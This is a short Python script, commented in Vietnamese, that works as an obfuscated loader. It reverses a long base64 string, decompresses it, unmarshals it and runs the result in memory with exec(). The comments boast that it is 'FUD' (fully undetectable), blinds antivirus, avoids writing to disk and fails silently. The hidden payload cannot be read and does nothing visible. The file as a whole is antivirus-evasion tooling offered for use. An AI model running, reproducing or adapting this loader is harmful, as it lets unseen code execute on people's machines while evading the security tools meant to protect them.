import marshal, zlib, base64

# ===============================================
# FILE NÀY ĐÃ ĐƯỢC MẶC ÁO TÀNG HÌNH (FUD)
# Bất kỳ Antivirus nào quét vào cũng sẽ bị mù màu!
# ===============================================

try:
    _obf = "==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"
    
    # Trả chuỗi về hình dạng ban đầu
    _obf = _obf[::-1]
    
    # Giải nén và dịch ngược
    _dec = zlib.decompress(base64.b64decode(_obf))
    
    # BƠM TRỰC TIẾP VÀO RAM VÀ CHẠY (Không rớt rác ra ổ cứng)
    exec(marshal.loads(_dec))
except Exception:
    # Lỗi thì im lặng tự sát
    pass
